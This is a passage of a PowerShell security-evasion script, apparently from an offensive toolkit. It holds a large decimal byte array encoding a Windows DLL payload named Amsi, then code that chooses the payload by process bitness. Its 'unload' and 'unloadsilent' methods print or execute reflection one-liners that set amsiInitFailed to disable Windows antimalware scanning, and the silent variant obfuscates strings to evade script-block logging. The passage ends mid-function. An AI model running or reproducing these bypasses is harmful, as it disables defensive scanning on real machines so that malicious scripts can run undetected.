0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 216 29 0 128 1 0 0 0 80 30 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 48 0 128 1 0 0 0 240 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 136 29 62 87 0 0 0 0 2 0 0 0 65 0 0 0 116 34 0 0 116 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 12 0 0 0 20 0 0 0 184 34 0 0 184 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 13 0 0 0 68 2 0 0 204 34 0 0 204 22 0 0 0 0 0 0 136 29 62 87 0 0 0 0 14 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 48 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 248 32 0 128 1 0 0 0 0 33 0 128 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 82 83 68 83 42 80 223 113 29 247 64 69 188 37 18 40 145 144 25 190 50 0 0 0 67 58 92 68 101 118 101 108 111 112 109 101 110 116 92 65 109 115 105 92 120 54 52 92 82 101 108 101 97 115 101 92 65 109 115 105 46 112 100 98 0 0 0 0 0 0 0 0 18 0 0 0 18 0 0 0 1 0 0 0 17 0 0 0 71 67 84 76 0 16 0 0 63 14 0 0 46 116 101 120 116 36 109 110 0 0 0 0 64 30 0 0 18 0 0 0 46 116 101 120 116 36 109 110 36 48 48 0 82 30 0 0 129 0 0 0 46 116 101 120 116 36 120 0 0 32 0 0 248 0 0 0 46 105 100 97 116 97 36 53 0 0 0 0 248 32 0 0 16 0 0 0 46 48 48 99 102 103 0 0 8 33 0 0 8 0 0 0 46 67 82 84 36 88 67 65 0 0 0 0 16 33 0 0 8 0 0 0 46 67 82 84 36 88 67 90 0 0 0 0 24 33 0 0 8 0 0 0 46 67 82 84 36 88 73 65 0 0 0 0 32 33 0 0 8 0 0 0 46 67 82 84 36 88 73 90 0 0 0 0 40 33 0 0 8 0 0 0 46 67 82 84 36 88 80 65 0 0 0 0 48 33 0 0 8 0 0 0 46 67 82 84 36 88 80 90 0 0 0 0 56 33 0 0 8 0 0 0 46 67 82 84 36 88 84 65 0 0 0 0 64 33 0 0 8 0 0 0 46 67 82 84 36 88 84 90 0 0 0 0 80 33 0 0 36 1 0 0 46 114 100 97 116 97 0 0 116 34 0 0 156 2 0 0 46 114 100 97 116 97 36 122 122 122 100 98 103 0 0 0 16 37 0 0 8 0 0 0 46 114 116 99 36 73 65 65 0 0 0 0 24 37 0 0 8 0 0 0 46 114 116 99 36 73 90 90 0 0 0 0 32 37 0 0 8 0 0 0 46 114 116 99 36 84 65 65 0 0 0 0 40 37 0 0 8 0 0 0 46 114 116 99 36 84 90 90 0 0 0 0 48 37 0 0 60 1 0 0 46 120 100 97 116 97 0 0 108 38 0 0 60 0 0 0 46 105 100 97 116 97 36 50 0 0 0 0 168 38 0 0 20 0 0 0 46 105 100 97 116 97 36 51 0 0 0 0 192 38 0 0 248 0 0 0 46 105 100 97 116 97 36 52 0 0 0 0 184 39 0 0 200 2 0 0 46 105 100 97 116 97 36 54 0 0 0 0 0 48 0 0 52 0 0 0 46 100 97 116 97 0 0 0 64 48 0 0 0 6 0 0 46 98 115 115 0 0 0 0 0 64 0 0 176 1 0 0 46 112 100 97 116 97 0 0 0 80 0 0 16 0 0 0 46 103 102 105 100 115 36 121 0 0 0 0 0 96 0 0 88 0 0 0 46 114 115 114 99 36 48 49 0 0 0 0 96 96 0 0 128 1 0 0 46 114 115 114 99 36 48 50 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 17 21 8 0 21 116 9 0 21 100 7 0 21 52 6 0 21 50 17 224 236 29 0 0 1 0 0 0 207 16 0 0 92 17 0 0 82 30 0 0 0 0 0 0 17 15 6 0 15 100 8 0 15 52 6 0 15 50 11 112 236 29 0 0 1 0 0 0 246 17 0 0 20 18 0 0 105 30 0 0 0 0 0 0 1 6 2 0 6 50 2 80 1 20 8 0 20 100 8 0 20 84 7 0 20 52 6 0 20 50 16 112 9 26 6 0 26 52 15 0 26 114 22 224 20 112 19 96 236 29 0 0 1 0 0 0 102 18 0 0 54 19 0 0 133 30 0 0 54 19 0 0 1 6 2 0 6 82 2 80 1 9 1 0 9 98 0 0 1 8 4 0 8 114 4 112 3 96 2 48 9 4 1 0 4 34 0 0 236 29 0 0 1 0 0 0 215 23 0 0 101 24 0 0 187 30 0 0 101 24 0 0 1 2 1 0 2 80 0 0 1 4 1 0 4 66 0 0 1 6 2 0 6 50 2 48 1 13 4 0 13 52 10 0 13 114 6 80 1 13 4 0 13 52 9 0 13 50 6 80 1 21 5 0 21 52 186 0 21 1 184 0 6 80 0 0 1 15 6 0 15 100 7 0 15 52 6 0 15 50 11 112 1 13 4 0 13 52 7 0 13 50 6 80 0 0 0 0 1 0 0 0 56 39 0 0 0 0 0 0 0 0 0 0 62 40 0 0 120 32 0 0 104 39 0 0 0 0 0 0 0 0 0 0 6 41 0 0 168 32 0 0 192 38 0 0 0 0 0 0 0 0 0 0 114 42 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 106 41 0 0 0 0 0 0 86 41 0 0 0 0 0 0 60 41 0 0 0 0 0 0 40 41 0 0 0 0 0 0 164 41 0 0 0 0 0 0 94 42 0 0 0 0 0 0 72 42 0 0 0 0 0 0 46 42 0 0 0 0 0 0 24 42 0 0 0 0 0 0 2 42 0 0 0 0 0 0 232 41 0 0 0 0 0 0 204 41 0 0 0 0 0 0 184 41 0 0 0 0 0 0 134 41 0 0 0 0 0 0 0 0 0 0 0 0 0 0 52 40 0 0 0 0 0 0 20 40 0 0 0 0 0 0 252 39 0 0 0 0 0 0 218 39 0 0 0 0 0 0 184 39 0 0 0 0 0 0 0 0 0 0 0 0 0 0 252 40 0 0 0 0 0 0 238 40 0 0 0 0 0 0 214 40 0 0 0 0 0 0 186 40 0 0 0 0 0 0 158 40 0 0 0 0 0 0 124 40 0 0 0 0 0 0 106 40 0 0 0 0 0 0 92 40 0 0 0 0 0 0 80 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 40 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 105 110 118 111 107 101 95 116 114 105 103 103 101 114 0 41 0 95 95 116 101 108 101 109 101 116 114 121 95 109 97 105 110 95 114 101 116 117 114 110 95 116 114 105 103 103 101 114 0 8 0 95 95 67 95 115 112 101 99 105 102 105 99 95 104 97 110 100 108 101 114 0 0 37 0 95 95 115 116 100 95 116 121 112 101 95 105 110 102 111 95 100 101 115 116 114 111 121 95 108 105 115 116 0 0 62 0 109 101 109 115 101 116 0 0 86 67 82 85 78 84 73 77 69 49 52 48 46 100 108 108 0 0 54 0 95 105 110 105 116 116 101 114 109 0 55 0 95 105 110 105 116 116 101 114 109 95 101 0 63 0 95 115 101 104 95 102 105 108 116 101 114 95 100 108 108 0 51 0 95 105 110 105 116 105 97 108 105 122 101 95 110 97 114 114 111 119 95 101 110 118 105 114 111 110 109 101 110 116 0 0 52 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 60 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 34 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 30 0 95 99 114 116 95 97 116 101 120 105 116 0 22 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 174 4 82 116 108 67 97 112 116 117 114 101 67 111 110 116 101 120 116 0 181 4 82 116 108 76 111 111 107 117 112 70 117 110 99 116 105 111 110 69 110 116 114 121 0 0 188 4 82 116 108 86 105 114 116 117 97 108 85 110 119 105 110 100 0 0 146 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 82 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 15 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 112 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 112 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 48 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 16 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 20 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 221 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 84 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 106 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 50 162 223 45 153 43 0 0 205 93 32 210 102 212 255 255 255 255 255 255 0 0 0 0 1 0 0 0 2 0 0 0 47 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 16 0 0 65 16 0 0 48 37 0 0 68 16 0 0 148 16 0 0 16 38 0 0 148 16 0 0 191 17 0 0 52 37 0 0 192 17 0 0 66 18 0 0 96 37 0 0 68 18 0 0 76 19 0 0 164 37 0 0 76 19 0 0 160 19 0 0 144 37 0 0 160 19 0 0 221 19 0 0 72 38 0 0 224 19 0 0 20 20 0 0 24 38 0 0 20 20 0 0 229 20 0 0 212 37 0 0 232 20 0 0 89 21 0 0 220 37 0 0 92 21 0 0 149 21 0 0 16 38 0 0 152 21 0 0 184 21 0 0 16 38 0 0 184 21 0 0 205 21 0 0 16 38 0 0 208 21 0 0 248 21 0 0 16 38 0 0 248 21 0 0 13 22 0 0 16 38 0 0 16 22 0 0 113 22 0 0 144 37 0 0 116 22 0 0 164 22 0 0 16 38 0 0 164 22 0 0 184 22 0 0 16 38 0 0 184 22 0 0 1 23 0 0 24 38 0 0 4 23 0 0 205 23 0 0 32 38 0 0 208 23 0 0 108 24 0 0 232 37 0 0 108 24 0 0 144 24 0 0 24 38 0 0 144 24 0 0 187 24 0 0 24 38 0 0 188 24 0 0 11 25 0 0 24 38 0 0 12 25 0 0 35 25 0 0 16 38 0 0 36 25 0 0 208 25 0 0 44 38 0 0 252 25 0 0 23 26 0 0 16 38 0 0 32 26 0 0 101 27 0 0 56 38 0 0 104 27 0 0 178 27 0 0 72 38 0 0 180 27 0 0 254 27 0 0 72 38 0 0 8 28 0 0 201 29 0 0 88 38 0 0 80 30 0 0 82 30 0 0 104 38 0 0 82 30 0 0 105 30 0 0 136 37 0 0 105 30 0 0 133 30 0 0 136 37 0 0 133 30 0 0 187 30 0 0 204 37 0 0 187 30 0 0 211 30 0 0 8 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 11 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 96 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 24 0 0 0 248 160 0 161 88 161 96 161 56 162 80 162 88 162 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0"

    if (([IntPtr]::Size) -eq 8)
    {
        Write-Verbose "64 bit process detected."
        $DllBytes = $AmsiX64
    }
    elseif (([IntPtr]::Size) -eq 4)
    {
        Write-Verbose "32 bit process detected."
        $DllBytes = $AmsiX86
    }
    
    switch($method)
    {
    
        "unload"
        {
            Write-Verbose "Using Matt Graeber's Reflection method."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue($null,$true)'
            }
            else
            {
                Write-Output "Executing the bypass."
                [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            }
        }

        "unloadsilent"
        {
            Write-Verbose "Using Matt Graeber's Reflection method with WMF5 autologging bypass."
            if ($ShowOnly -eq $True)
            {
                Write-Output "Use the following scriptblock before you run a script which gets detected."
                Write-Output '[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags'')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType(''System.T''+''ype'')), [Object]([Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'')),(''GetFie''+''ld'')).Invoke(''amsiInitFailed'',((''Non''+''Public,Static'') -as [String].Assembly.GetType(''System.Reflection.Bindin''+''gFlags''))).SetValue($null,$True)'
            }
            else
            {
                Write-Output "Executing the bypass."
